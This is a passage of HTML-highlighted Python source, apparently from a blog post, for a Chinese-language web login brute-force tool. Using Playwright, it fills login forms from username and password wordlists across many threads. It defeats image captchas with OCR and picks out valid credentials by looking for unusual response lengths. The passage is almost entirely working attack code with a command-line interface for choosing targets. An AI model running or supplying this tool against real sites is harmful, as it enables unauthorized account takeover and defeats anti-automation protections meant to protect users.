class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 使用ddddocr进行验证码识别</span></span><br><span class="line">            ocr = ddddocr.DdddOcr(show_ad=<span class="literal">False</span>)</span><br><span class="line">            text = ocr.classification(image_data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;验证码识别结果: <span class="subst">&#123;text&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> text.strip()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;验证码识别失败：未识别出文本&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;验证码识别失败：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">solve_captcha</span>(<span class="params">self, page: Page</span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        解决验证码</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            page: Playwright页面对象</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            验证码文本或None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 检查验证码XPath是否有效</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.captcha_img_xpath <span class="keyword">or</span> <span class="keyword">not</span> <span class="variable language_">self</span>.captcha_input_xpath:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                </span><br><span class="line">            <span class="comment"># 等待验证码图片加载</span></span><br><span class="line">            <span class="keyword">await</span> page.wait_for_selector(<span class="string">f&quot;xpath=<span class="subst">&#123;self.captcha_img_xpath&#125;</span>&quot;</span>, timeout=<span class="number">5000</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 获取验证码图片</span></span><br><span class="line">            captcha_locator = page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.captcha_img_xpath&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 检查元素是否存在</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">await</span> captcha_locator.count() == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                </span><br><span class="line">            <span class="comment"># 截图获取验证码</span></span><br><span class="line">            screenshot = <span class="keyword">await</span> captcha_locator.first.screenshot()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 识别验证码</span></span><br><span class="line">            captcha_text = <span class="variable language_">self</span>.preprocess_captcha(screenshot)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> captcha_text:</span><br><span class="line">                <span class="comment"># 输入验证码</span></span><br><span class="line">                <span class="keyword">await</span> page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.captcha_input_xpath&#125;</span>&quot;</span>).fill(captcha_text)</span><br><span class="line">                <span class="keyword">return</span> captcha_text</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;验证码处理失败：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">attempt_login</span>(<span class="params">self, username: <span class="built_in">str</span>, password: <span class="built_in">str</span>, thread_id: <span class="built_in">int</span></span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        尝试登录</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            username: 用户名</span></span><br><span class="line"><span class="string">            password: 密码</span></span><br><span class="line"><span class="string">            thread_id: 线程ID</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            登录结果字典</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        result = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">            <span class="string">&#x27;username_length&#x27;</span>: <span class="built_in">len</span>(username),</span><br><span class="line">            <span class="string">&#x27;password_length&#x27;</span>: <span class="built_in">len</span>(password),</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&#x27;thread_id&#x27;</span>: thread_id,</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>: time.time()</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">async</span> <span class="keyword">with</span> async_playwright() <span class="keyword">as</span> p:</span><br><span class="line">                <span class="comment"># 启动浏览器</span></span><br><span class="line">                browser = <span class="keyword">await</span> p.chromium.launch(headless=<span class="literal">True</span>)</span><br><span class="line">                context = <span class="keyword">await</span> browser.new_context()</span><br><span class="line">                page = <span class="keyword">await</span> context.new_page()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 访问目标页面</span></span><br><span class="line">                <span class="keyword">await</span> page.goto(<span class="variable language_">self</span>.target_url, wait_until=<span class="string">&#x27;networkidle&#x27;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 填写用户名和密码</span></span><br><span class="line">                <span class="keyword">await</span> page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.username_xpath&#125;</span>&quot;</span>).fill(username)</span><br><span class="line">                <span class="keyword">await</span> page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.password_xpath&#125;</span>&quot;</span>).fill(password)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 处理验证码（如果存在）</span></span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.captcha_img_xpath <span class="keyword">and</span> <span class="variable language_">self</span>.captcha_input_xpath:</span><br><span class="line">                    captcha_text = <span class="keyword">await</span> <span class="variable language_">self</span>.solve_captcha(page)</span><br><span class="line">                    <span class="keyword">if</span> captcha_text:</span><br><span class="line">                        result[<span class="string">&#x27;captcha&#x27;</span>] = captcha_text</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 点击登录按钮</span></span><br><span class="line">                <span class="keyword">await</span> page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.login_button_xpath&#125;</span>&quot;</span>).click()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 等待页面响应</span></span><br><span class="line">                <span class="keyword">await</span> page.wait_for_timeout(<span class="number">2000</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 获取页面内容用于长度分析</span></span><br><span class="line">                page_content = <span class="keyword">await</span> page.content()</span><br><span class="line">                content_length = <span class="built_in">len</span>(page_content)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 将响应长度保存到结果中，用于后续分析</span></span><br><span class="line">                result[<span class="string">&#x27;response_length&#x27;</span>] = content_length</span><br><span class="line">                result[<span class="string">&#x27;final_url&#x27;</span>] = page.url</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 注意：这里不直接判断成功/失败，而是记录响应长度</span></span><br><span class="line">                <span class="comment"># 真正的成功判断将在所有尝试完成后通过分析响应长度重复率来确定</span></span><br><span class="line">                result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">None</span>  <span class="comment"># 暂时不判断，等待后续分析</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">await</span> browser.close()</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            result[<span class="string">&#x27;error&#x27;</span>] = <span class="built_in">str</span>(e)</span><br><span class="line">            result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_result</span>(<span class="params">self, result: <span class="built_in">dict</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;处理单个结果&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="variable language_">self</span>.lock:</span><br><span class="line">            <span class="variable language_">self</span>.results.append(result)</span><br><span class="line">            <span class="comment"># 输出格式：用户名 | 密码 | 响应长度</span></span><br><span class="line">            response_length = result.get(<span class="string">&#x27;response_length&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;result[<span class="string">&#x27;username&#x27;</span>]&#125;</span> | <span class="subst">&#123;result[<span class="string">&#x27;password&#x27;</span>]&#125;</span> | <span class="subst">&#123;response_length&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 暂时不判断成功/失败，等待所有结果收集完成后统一分析</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">analyze_response_lengths</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;分析响应长度重复率来判断登录成功&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.results:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 统计响应长度出现次数</span></span><br><span class="line">        length_counts = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> <span class="variable language_">self</span>.results:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;response_length&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                length = result[<span class="string">&#x27;response_length&#x27;</span>]</span><br><span class="line">                <span class="keyword">if</span> length <span class="keyword">not</span> <span class="keyword">in</span> length_counts:</span><br><span class="line">                    length_counts[length] = []</span><br><span class="line">                length_counts[length].append(result)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 按出现次数排序（重复率从高到低）</span></span><br><span class="line">        sorted_lengths = <span class="built_in">sorted</span>(length_counts.items(), key=<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x[<span class="number">1</span>]), reverse=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n响应长度分析:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发现 <span class="subst">&#123;<span class="built_in">len</span>(length_counts)&#125;</span> 种不同的响应长度&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 分析结果</span></span><br><span class="line">        <span class="keyword">for</span> i, (length, results) <span class="keyword">in</span> <span class="built_in">enumerate</span>(sorted_lengths):</span><br><span class="line">            count = <span class="built_in">len</span>(results)</span><br><span class="line">            percentage = (count / <span class="built_in">len</span>(<span class="variable language_">self</span>.results)) * <span class="number">100</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  长度 <span class="subst">&#123;length&#125;</span>: 出现 <span class="subst">&#123;count&#125;</span> 次 (<span class="subst">&#123;percentage:<span class="number">.1</span>f&#125;</span>%)&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 如果这个长度只出现一次，可能是登录成功</span></span><br><span class="line">            <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">                result = results[<span class="number">0</span>]</span><br><span class="line">                result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">                result[<span class="string">&#x27;analysis_reason&#x27;</span>] = <span class="string">f&#x27;唯一响应长度 <span class="subst">&#123;length&#125;</span>&#x27;</span></span><br><span class="line">                <span class="variable language_">self</span>.success_count += <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    → 标记为可能成功: <span class="subst">&#123;result[<span class="string">&#x27;username&#x27;</span>]&#125;</span>:<span class="subst">&#123;result[<span class="string">&#x27;password&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 标记为失败（重复率高）</span></span><br><span class="line">                <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">                    result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">                    result[<span class="string">&#x27;analysis_reason&#x27;</span>] = <span class="string">f&#x27;响应长度重复 <span class="subst">&#123;count&#125;</span> 次&#x27;</span></span><br><span class="line">                    <span class="variable language_">self</span>.failed_count += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果没有唯一长度，选择重复率最低的作为可能的成功</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.success_count == <span class="number">0</span> <span class="keyword">and</span> sorted_lengths:</span><br><span class="line">            <span class="comment"># 找到重复率最低的长度</span></span><br><span class="line">            min_count = <span class="built_in">min</span>(<span class="built_in">len</span>(results) <span class="keyword">for</span> _, results <span class="keyword">in</span> sorted_lengths)</span><br><span class="line">            <span class="keyword">for</span> length, results <span class="keyword">in</span> sorted_lengths:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(results) == min_count:</span><br><span class="line">                    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">                        result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">                        result[<span class="string">&#x27;analysis_reason&#x27;</span>] = <span class="string">f&#x27;重复率最低的响应长度 <span class="subst">&#123;length&#125;</span> (重复 <span class="subst">&#123;min_count&#125;</span> 次)&#x27;</span></span><br><span class="line">                        <span class="variable language_">self</span>.success_count += <span class="number">1</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  选择重复率最低的长度 <span class="subst">&#123;length&#125;</span> 作为可能的成功&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run_bruteforce</span>(<span class="params">self, usernames: <span class="type">List</span>[<span class="built_in">str</span>], passwords: <span class="type">List</span>[<span class="built_in">str</span>]</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        运行爆破攻击</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            usernames: 用户名列表</span></span><br><span class="line"><span class="string">            passwords: 密码列表</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n目标URL: <span class="subst">&#123;self.target_url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;用户名数量: <span class="subst">&#123;<span class="built_in">len</span>(usernames)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;密码数量: <span class="subst">&#123;<span class="built_in">len</span>(passwords)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;总尝试次数: <span class="subst">&#123;<span class="built_in">len</span>(usernames) * <span class="built_in">len</span>(passwords)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;线程数: <span class="subst">&#123;self.max_threads&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        </span><br><span class="line">        start_time = time.time()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建所有可能的用户名密码组合</span></span><br><span class="line">        combinations = []</span><br><span class="line">        <span class="keyword">for</span> username <span class="keyword">in</span> usernames:</span><br><span class="line">            <span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">                combinations.append((username, password))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用线程池执行</span></span><br><span class="line">        <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="variable language_">self</span>.max_threads) <span class="keyword">as</span> executor:</span><br><span class="line">            <span class="comment"># 提交所有任务</span></span><br><span class="line">            future_to_combo = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> i, (username, password) <span class="keyword">in</span> <span class="built_in">enumerate</span>(combinations):</span><br><span class="line">                future = executor.submit(</span><br><span class="line">                    asyncio.run, </span><br><span class="line">                    <span class="variable language_">self</span>.attempt_login(username, password, i % <span class="variable language_">self</span>.max_threads)</span><br><span class="line">                )</span><br><span class="line">                future_to_combo[future] = (username, password)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 处理完成的任务</span></span><br><span class="line">            <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(future_to_combo):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    result = future.result()</span><br><span class="line">                    <span class="variable language_">self</span>.process_result(result)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    username, password = future_to_combo[future]</span><br><span class="line">                    error_result = &#123;</span><br><span class="line">                        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">                        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">                        <span class="string">&#x27;username_length&#x27;</span>: <span class="built_in">len</span>(username),</span><br><span class="line">                        <span class="string">&#x27;password_length&#x27;</span>: <span class="built_in">len</span>(password),</span><br><span class="line">                        <span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">                        <span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e),</span><br><span class="line">                        <span class="string">&#x27;thread_id&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="string">&#x27;timestamp&#x27;</span>: time.time()</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable language_">self</span>.process_result(error_result)</span><br><span class="line">        </span><br><span class="line">        end_time = time.time()</span><br><span class="line">        duration = end_time - start_time</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 分析响应长度重复率</span></span><br><span class="line">        <span class="variable language_">self</span>.analyze_response_lengths()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 输出统计信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;总耗时: <span class="subst">&#123;duration:<span class="number">.2</span>f&#125;</span>秒&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;成功: <span class="subst">&#123;self.success_count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;失败: <span class="subst">&#123;self.failed_count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;成功率: <span class="subst">&#123;(self.success_count / <span class="built_in">len</span>(combinations) * <span class="number">100</span>):<span class="number">.2</span>f&#125;</span>%&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 输出成功的结果</span></span><br><span class="line">        successful_results = [r <span class="keyword">for</span> r <span class="keyword">in</span> <span class="variable language_">self</span>.results <span class="keyword">if</span> r.get(<span class="string">&#x27;success&#x27;</span>) == <span class="literal">True</span>]</span><br><span class="line">        <span class="keyword">if</span> successful_results:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n可能的凭据:&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> result <span class="keyword">in</span> successful_results:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  用户名: <span class="subst">&#123;result[<span class="string">&#x27;username&#x27;</span>]&#125;</span> (长度: <span class="subst">&#123;result[<span class="string">&#x27;username_length&#x27;</span>]&#125;</span>)&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  密码: <span class="subst">&#123;result[<span class="string">&#x27;password&#x27;</span>]&#125;</span> (长度: <span class="subst">&#123;result[<span class="string">&#x27;password_length&#x27;</span>]&#125;</span>)&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  响应长度: <span class="subst">&#123;result.get(<span class="string">&#x27;response_length&#x27;</span>, <span class="number">0</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  分析原因: <span class="subst">&#123;result.get(<span class="string">&#x27;analysis_reason&#x27;</span>, <span class="string">&#x27;未知&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;final_url&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  最终URL: <span class="subst">&#123;result[<span class="string">&#x27;final_url&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.results</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;主函数&quot;&quot;&quot;</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Web登录爆破工具&#x27;</span>, formatter_class=CustomHelpFormatter)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--url&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;目标URL&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--username-xpath&#x27;</span>, <span class="string">&#x27;-ux&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;用户名输入框XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--password-xpath&#x27;</span>, <span class="string">&#x27;-px&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;密码输入框XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--captcha-img-xpath&#x27;</span>, <span class="string">&#x27;-cx&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;验证码图片XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--captcha-input-xpath&#x27;</span>, <span class="string">&#x27;-cix&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;验证码输入框XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--login-button-xpath&#x27;</span>, <span class="string">&#x27;-lx&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;登录按钮XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--threads&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5</span>, <span class="built_in">help</span>=<span class="string">&#x27;线程数量 (默认: 5)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--usernames&#x27;</span>, <span class="string">&#x27;-uf&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;用户名文件路径&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--passwords&#x27;</span>, <span class="string">&#x27;-pf&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;密码文件路径&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--output&#x27;</span>, <span class="string">&#x27;-o&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;输出结果到文件 (支持 .xlsx, .csv, .json 格式)&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建爆破器实例</span></span><br><span class="line">    bruster = LoginBruster(</span><br><span class="line">        target_url=args.url,</span><br><span class="line">        username_xpath=args.username_xpath,</span><br><span class="line">        password_xpath=args.password_xpath,</span><br><span class="line">        captcha_img_xpath=args.captcha_img_xpath,</span><br><span class="line">        captcha_input_xpath=args.captcha_input_xpath,</span><br><span class="line">        login_button_xpath=args.login_button_xpath,</span><br><span class="line">        max_threads=args.threads</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 加载用户名和密码文件</span></span><br><span class="line">    usernames = bruster.load_wordlist(args.usernames)</span><br><span class="line">    passwords = bruster.load_wordlist(args.passwords)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> usernames:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误：无法加载用户名文件或文件为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> passwords:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误：无法加载密码文件或文件为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 运行爆破</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        results = asyncio.run(bruster.run_bruteforce(usernames, passwords))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 保存结果到文件</span></span><br><span class="line">        <span class="keyword">if</span> args.output:</span><br><span class="line">            <span class="comment"># 创建DataFrame</span></span><br><span class="line">            df_data = []</span><br><span class="line">            <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">                df_data.append(&#123;</span><br><span class="line">                    <span class="string">&#x27;用户名&#x27;</span>: result[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;密码&#x27;</span>: result[<span class="string">&#x27;password&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;响应长度&#x27;</span>: <span class="built_in">len</span>(result.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">if</span> result.get(<span class="string">&#x27;error&#x27;</span>) <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">                    <span class="string">&#x27;登录成功&#x27;</span>: result[<span class="string">&#x27;success&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;错误信息&#x27;</span>: result.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                    <span class="string">&#x27;线程ID&#x27;</span>: result[<span class="string">&#x27;thread_id&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;时间戳&#x27;</span>: result[<span class="string">&#x27;timestamp&#x27;</span>]</span><br><span class="line">                &#125;)</span><br><span class="line">            </span><br><span class="line">            df = pd.DataFrame(df_data)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 根据文件扩展名选择保存格式</span></span><br><span class="line">            <span class="keyword">if</span> args.output.endswith(<span class="string">&#x27;.xlsx&#x27;</span>):</span><br><span class="line">                df.to_excel(args.output, index=<span class="literal">False</span>, engine=<span class="string">&#x27;openpyxl&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n结果已保存到Excel文件: <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> args.output.endswith(<span class="string">&#x27;.csv&#x27;</span>):</span><br><span class="line">                df.to_csv(args.output, index=<span class="literal">False</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n结果已保存到CSV文件: <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 默认保存为JSON</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    json.dump(results, f, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n结果已保存到JSON文件: <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nExit!&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;运行出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">       _                              _           __     __     ___ </span></span><br><span class="line"><span class="string"> ___  | |__     __ _  